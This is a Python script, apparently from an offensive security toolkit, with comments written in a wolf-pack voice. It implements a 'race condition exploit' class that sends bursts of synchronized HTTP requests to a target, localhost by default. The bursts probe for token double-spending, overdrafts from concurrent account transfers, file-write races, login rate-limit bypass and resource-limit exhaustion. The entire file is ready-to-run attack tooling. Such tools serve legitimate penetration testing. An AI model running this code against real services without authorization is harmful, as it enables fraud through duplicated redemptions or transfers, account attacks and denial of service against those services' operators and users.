#!/usr/bin/env python3
"""
üê∫ Race Condition and Concurrency Bug Exploits

*snarls with pack coordination* These exploits hunt for race conditions and
concurrency bugs in web applications. We coordinate rapid parallel requests
to exploit timing windows, state inconsistencies, and TOCTOU vulnerabilities!

Based on 2025 research showing race conditions in financial systems, authentication,
and resource management. The pack synchronizes timing attacks, token double-spending,
and state manipulation to exploit millisecond-wide vulnerability windows!
"""

import asyncio
import aiohttp
import time
from typing import List, Dict, Any, Optional, Callable
import logging
import json
import threading
from concurrent.futures import ThreadPoolExecutor
import statistics

# Configure logging
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)


class RaceConditionExploit:
    """
    üê∫ *pack synchronization* Race condition exploitation class that coordinates
    high-precision timing attacks to exploit concurrency vulnerabilities.
    """
    
    def __init__(self, target_url: str = "http://localhost:8000"):
        self.target_url = target_url.rstrip('/')
        self.session: Optional[aiohttp.ClientSession] = None
        self.timing_data: List[float] = []
        
    async def __aenter__(self):
        connector = aiohttp.TCPConnector(limit=200, limit_per_host=100)
        timeout = aiohttp.ClientTimeout(total=30, connect=10)
        self.session = aiohttp.ClientSession(connector=connector, timeout=timeout)
        return self
        
    async def __aexit__(self, exc_type, exc_val, exc_tb):
        if self.session:
            await self.session.close()
    
    async def time_synchronized_requests(self, request_func: Callable, 
                                       num_requests: int = 10,
                                       delay_between: float = 0.0) -> List[Dict[str, Any]]:
        """
        üê∫ *pack coordination* Execute multiple requests with precise timing
        to exploit race condition windows.
        """
        if not self.session:
            return []
        
        results = []
        start_time = time.time()
        
        # Create tasks for simultaneous execution
        tasks = []
        for i in range(num_requests):
            task = asyncio.create_task(
                self._timed_request_wrapper(request_func, i, start_time + delay_between * i)
            )
            tasks.append(task)
        
        # Execute all requests
        logger.info(f"üê∫ Launching {num_requests} synchronized requests...")
        completed_results = await asyncio.gather(*tasks, return_exceptions=True)
        
        # Process results
        for i, result in enumerate(completed_results):
            if isinstance(result, Exception):
                results.append({
                    'request_id': i,
                    'error': str(result),
                    'success': False,
                    'timing': None
                })
            else:
                results.append(result)
        
        # Calculate timing statistics
        successful_timings = [r['timing'] for r in results if r.get('timing') is not None]
        if successful_timings:
            timing_stats = {
                'min_time': min(successful_timings),
                'max_time': max(successful_timings),
                'avg_time': statistics.mean(successful_timings),
                'std_dev': statistics.stdev(successful_timings) if len(successful_timings) > 1 else 0
            }
            logger.info(f"üê∫ Timing stats: {timing_stats}")
        
        return results
    
    async def _timed_request_wrapper(self, request_func: Callable, request_id: int, 
                                   target_time: float) -> Dict[str, Any]:
        """
        üê∫ *precise strike timing* Wrapper for timed request execution.
        """
        # Wait until target time
        current_time = time.time()
        if target_time > current_time:
            await asyncio.sleep(target_time - current_time)
        
        start_time = time.time()
        try:
            result = await request_func(request_id)
            end_time = time.time()
            
            result.update({
                'request_id': request_id,
                'timing': end_time - start_time,
                'start_time': start_time,
                'success': True
            })
            return result
            
        except Exception as e:
            end_time = time.time()
            return {
                'request_id': request_id,
                'error': str(e),
                'timing': end_time - start_time,
                'start_time': start_time,
                'success': False
            }
    
    async def test_token_double_spending(self, endpoint: str = "/api/redeem", 
                                       token: str = "test_token") -> Dict[str, Any]:
        """
        üê∫ *howls with greed* Test for token double-spending vulnerabilities
        by rapidly submitting the same token multiple times.
        """
        logger.info(f"üê∫ Testing token double-spending on {endpoint}")
        
        async def redeem_request(request_id: int) -> Dict[str, Any]:
            data = {'token': token, 'amount': 100}
            async with self.session.post(
                f"{self.target_url}{endpoint}",
                json=data
            ) as response:
                response_text = await response.text()
                return {
                    'status_code': response.status,
                    'response': response_text[:200],
                    'headers': dict(response.headers)
                }
        
        # Execute rapid requests
        results = await self.time_synchronized_requests(redeem_request, num_requests=20)
        
        # Analyze results for double-spending
        successful_redemptions = [r for r in results if r.get('status_code') == 200]
        
        analysis = {
            'endpoint': endpoint,
            'token_tested': token,
            'total_requests': len(results),
            'successful_redemptions': len(successful_redemptions),
            'vulnerability_detected': len(successful_redemptions) > 1,
            'detailed_results': results,
            'attack_summary': {
                'multiple_success': len(successful_redemptions) > 1,
                'error_inconsistency': len(set(r.get('status_code', 0) for r in results)) > 2,
                'timing_anomaly': False
            }
        }
        
        if analysis['vulnerability_detected']:
            logger.warning(f"üê∫ TOKEN DOUBLE-SPENDING VULNERABILITY: {len(successful_redemptions)} successful redemptions")
        
        return analysis
    
    async def test_account_balance_race(self, endpoint: str = "/api/transfer", 
                                      from_account: str = "user1",
                                      to_account: str = "user2",
                                      amount: float = 100.0) -> Dict[str, Any]:
        """
        üê∫ *pack hunting formation* Test for account balance race conditions
        that could allow overdraft or double-spending.
        """
        logger.info(f"üê∫ Testing account balance race on {endpoint}")
        
        async def transfer_request(request_id: int) -> Dict[str, Any]:
            data = {
                'from_account': from_account,
                'to_account': to_account,
                'amount': amount
            }
            async with self.session.post(
                f"{self.target_url}{endpoint}",
                json=data
            ) as response:
                response_text = await response.text()
                
                # Try to parse JSON response for balance info
                balance_info = {}
                try:
                    response_json = await response.json()
                    if isinstance(response_json, dict):
                        balance_info = response_json
                except:
                    pass
                
                return {
                    'status_code': response.status,
                    'response': response_text[:200],
                    'balance_info': balance_info,
                    'headers': dict(response.headers)
                }
        
        # Execute rapid transfers
        results = await self.time_synchronized_requests(transfer_request, num_requests=15)
        
        # Analyze for race condition indicators
        successful_transfers = [r for r in results if r.get('status_code') == 200]
        
        analysis = {
            'endpoint': endpoint,
            'transfer_details': {
                'from_account': from_account,
                'to_account': to_account,
                'amount': amount
            },
            'total_requests': len(results),
            'successful_transfers': len(successful_transfers),
            'vulnerability_detected': False,
            'detailed_results': results,
            'race_indicators': {
                'multiple_success': len(successful_transfers) > 1,
                'inconsistent_balances': False,
                'overdraft_allowed': False
            }
        }
        
        # Check for inconsistent balance states
        balances = []
        for result in successful_transfers:
            balance_info = result.get('balance_info', {})
            if 'balance' in balance_info:
                balances.append(balance_info['balance'])
        
        if len(set(balances)) > 1:
            analysis['race_indicators']['inconsistent_balances'] = True
            analysis['vulnerability_detected'] = True
        
        if len(successful_transfers) > 1:
            analysis['vulnerability_detected'] = True
            logger.warning(f"üê∫ ACCOUNT RACE CONDITION: {len(successful_transfers)} successful transfers")
        
        return analysis
    
    async def test_file_write_race(self, endpoint: str = "/api/upload", 
                                 filename: str = "test.txt") -> Dict[str, Any]:
        """
        üê∫ *territorial marking* Test for file write race conditions that could
        lead to file corruption or privilege escalation.
        """
        logger.info(f"üê∫ Testing file write race on {endpoint}")
        
        async def upload_request(request_id: int) -> Dict[str, Any]:
            file_content = f"Content from request {request_id} - {time.time()}"
            data = aiohttp.FormData()
            data.add_field('file', file_content, filename=filename)
            data.add_field('overwrite', 'true')
            
            async with self.session.post(
                f"{self.target_url}{endpoint}",
                data=data
            ) as response:
                response_text = await response.text()
                return {
                    'status_code': response.status,
                    'response': response_text[:200],
                    'file_content': file_content,
                    'headers': dict(response.headers)
                }
        
        # Execute simultaneous uploads
        results = await self.time_synchronized_requests(upload_request, num_requests=10)
        
        successful_uploads = [r for r in results if r.get('status_code') == 200]
        
        analysis = {
            'endpoint': endpoint,
            'filename': filename,
            'total_requests': len(results),
            'successful_uploads': len(successful_uploads),
            'vulnerability_detected': len(successful_uploads) > 1,
            'detailed_results': results,
            'race_indicators': {
                'multiple_success': len(successful_uploads) > 1,
                'file_corruption_risk': len(successful_uploads) > 1,
                'access_control_bypass': False
            }
        }
        
        if analysis['vulnerability_detected']:
            logger.warning(f"üê∫ FILE WRITE RACE: {len(successful_uploads)} simultaneous uploads")
        
        return analysis
    
    async def test_authentication_race(self, endpoint: str = "/api/auth/login",
                                     username: str = "testuser",
                                     password: str = "testpass") -> Dict[str, Any]:
        """
        üê∫ *pack infiltration* Test for authentication race conditions that
        could bypass rate limiting or create multiple sessions.
        """
        logger.info(f"üê∫ Testing authentication race on {endpoint}")
        
        async def login_request(request_id: int) -> Dict[str, Any]:
            data = {
                'username': username,
                'password': password,
                'request_id': request_id  # Track individual requests
            }
            
            async with self.session.post(
                f"{self.target_url}{endpoint}",
                json=data
            ) as response:
                response_text = await response.text()
                
                # Extract tokens/session info
                session_info = {}
                try:
                    response_json = json.loads(response_text)
                    if 'token' in response_json:
                        session_info['token'] = response_json['token']
                    if 'session_id' in response_json:
                        session_info['session_id'] = response_json['session_id']
                except:
                    pass
                
                return {
                    'status_code': response.status,
                    'response': response_text[:200],
                    'session_info': session_info,
                    'cookies': {cookie.key: cookie.value for cookie in response.cookies},
                    'headers': dict(response.headers)
                }
        
        # Execute rapid login attempts
        results = await self.time_synchronized_requests(login_request, num_requests=25)
        
        successful_logins = [r for r in results if r.get('status_code') == 200]
        
        # Check for unique tokens/sessions
        unique_tokens = set()
        unique_sessions = set()
        
        for result in successful_logins:
            session_info = result.get('session_info', {})
            if 'token' in session_info:
                unique_tokens.add(session_info['token'])
            if 'session_id' in session_info:
                unique_sessions.add(session_info['session_id'])
        
        analysis = {
            'endpoint': endpoint,
            'username': username,
            'total_requests': len(results),
            'successful_logins': len(successful_logins),
            'unique_tokens': len(unique_tokens),
            'unique_sessions': len(unique_sessions),
            'vulnerability_detected': False,
            'detailed_results': results,
            'race_indicators': {
                'rate_limit_bypass': len(successful_logins) > 5,  # Assuming rate limit
                'multiple_sessions': len(unique_sessions) > 1,
                'token_collision': len(unique_tokens) < len(successful_logins),
                'session_fixation': False
            }
        }
        
        # Detect vulnerabilities
        if (analysis['race_indicators']['rate_limit_bypass'] or 
            analysis['race_indicators']['multiple_sessions'] or
            analysis['race_indicators']['token_collision']):
            analysis['vulnerability_detected'] = True
            logger.warning(f"üê∫ AUTHENTICATION RACE: {len(successful_logins)} successful logins")
        
        return analysis
    
    async def test_resource_exhaustion_race(self, endpoint: str = "/api/process",
                                          resource_limit: int = 5) -> Dict[str, Any]:
        """
        üê∫ *resource depletion* Test for race conditions in resource allocation
        that could lead to DoS or resource exhaustion.
        """
        logger.info(f"üê∫ Testing resource exhaustion race on {endpoint}")
        
        async def resource_request(request_id: int) -> Dict[str, Any]:
            data = {
                'operation': 'intensive_task',
                'duration': 10,  # Simulate long-running task
                'request_id': request_id
            }
            
            async with self.session.post(
                f"{self.target_url}{endpoint}",
                json=data
            ) as response:
                response_text = await response.text()
                return {
                    'status_code': response.status,
                    'response': response_text[:200],
                    'headers': dict(response.headers)
                }
        
        # Launch more requests than the limit
        num_requests = resource_limit * 3
        results = await self.time_synchronized_requests(resource_request, num_requests=num_requests)
        
        successful_requests = [r for r in results if r.get('status_code') == 200]
        rate_limited = [r for r in results if r.get('status_code') == 429]
        
        analysis = {
            'endpoint': endpoint,
            'resource_limit': resource_limit,
            'total_requests': len(results),
            'successful_requests': len(successful_requests),
            'rate_limited_requests': len(rate_limited),
            'vulnerability_detected': len(successful_requests) > resource_limit,
            'detailed_results': results,
            'race_indicators': {
                'limit_bypass': len(successful_requests) > resource_limit,
                'inconsistent_limiting': len(rate_limited) > 0 and len(successful_requests) > resource_limit,
                'resource_exhaustion': len(successful_requests) > resource_limit * 2
            }
        }
        
        if analysis['vulnerability_detected']:
            logger.warning(f"üê∫ RESOURCE RACE: {len(successful_requests)} requests exceeded limit of {resource_limit}")
        
        return analysis
    
    async def run_comprehensive_race_assessment(self) -> Dict[str, Any]:
        """
        üê∫ *alpha pack coordination* Run comprehensive race condition assessment
        across all vulnerability types.
        """
        logger.info("üê∫ Starting comprehensive race condition assessment...")
        
        assessment_results = {
            'target_url': self.target_url,
            'test_results': [],
            'overall_summary': {
                'total_tests': 0,
                'vulnerable_endpoints': 0,
                'high_risk_findings': 0,
                'race_types_found': []
            }
        }
        
        # Test different race condition types
        race_tests = [
            ('Token Double-Spending', self.test_token_double_spending, {}),
            ('Account Balance Race', self.test_account_balance_race, {}),
            ('File Write Race', self.test_file_write_race, {}),
            ('Authentication Race', self.test_authentication_race, {}),
            ('Resource Exhaustion Race', self.test_resource_exhaustion_race, {}),
        ]
        
        for test_name, test_func, test_kwargs in race_tests:
            try:
                logger.info(f"üê∫ Running {test_name} test...")
                result = await test_func(**test_kwargs)
                result['test_name'] = test_name
                assessment_results['test_results'].append(result)
                assessment_results['overall_summary']['total_tests'] += 1
                
                if result.get('vulnerability_detected', False):
                    assessment_results['overall_summary']['vulnerable_endpoints'] += 1
                    assessment_results['overall_summary']['race_types_found'].append(test_name)
                    
                    # High-risk findings
                    if 'Balance' in test_name or 'Token' in test_name or 'Authentication' in test_name:
                        assessment_results['overall_summary']['high_risk_findings'] += 1
                
                # Small delay between tests
                await asyncio.sleep(0.5)
                
            except Exception as e:
                logger.error(f"Error in {test_name} test: {str(e)}")
                assessment_results['test_results'].append({
                    'test_name': test_name,
                    'error': str(e),
                    'vulnerability_detected': False
                })
        
        logger.info(f"üê∫ Race condition assessment complete: "
                   f"{assessment_results['overall_summary']['vulnerable_endpoints']} vulnerable endpoints found")
        
        return assessment_results


async def main():
    """
    üê∫ *howls with pack coordination* Main hunting function for race condition exploitation.
    """
    target_url = "http://localhost:8000"
    
    async with RaceConditionExploit(target_url) as exploit:
        print("üê∫ Starting Race Condition and Concurrency Bug Assessment...")
        
        # Run comprehensive race condition assessment
        results = await exploit.run_comprehensive_race_assessment()
        
        print(f"\nüê∫ RACE CONDITION ASSESSMENT RESULTS:")
        print(f"Total tests: {results['overall_summary']['total_tests']}")
        print(f"Vulnerable endpoints: {results['overall_summary']['vulnerable_endpoints']}")
        print(f"High-risk findings: {results['overall_summary']['high_risk_findings']}")
        print(f"Race types found: {', '.join(results['overall_summary']['race_types_found'])}")
        
        # Show detailed results for vulnerable tests
        print(f"\nüê∫ VULNERABLE RACE CONDITIONS:")
        for test_result in results['test_results']:
            if test_result.get('vulnerability_detected', False):
                print(f"\n{test_result['test_name']}:")
                
                if 'successful_redemptions' in test_result:
                    print(f"  Multiple redemptions: {test_result['successful_redemptions']}")
                elif 'successful_transfers' in test_result:
                    print(f"  Multiple transfers: {test_result['successful_transfers']}")
                elif 'successful_uploads' in test_result:
                    print(f"  Multiple uploads: {test_result['successful_uploads']}")
                elif 'successful_logins' in test_result:
                    print(f"  Multiple logins: {test_result['successful_logins']}")
                    print(f"  Unique tokens: {test_result.get('unique_tokens', 0)}")
                elif 'successful_requests' in test_result:
                    print(f"  Requests over limit: {test_result['successful_requests']}")
                
                race_indicators = test_result.get('race_indicators', {})
                active_indicators = [k for k, v in race_indicators.items() if v]
                if active_indicators:
                    print(f"  Indicators: {', '.join(active_indicators)}")


if __name__ == "__main__":
    asyncio.run(main())
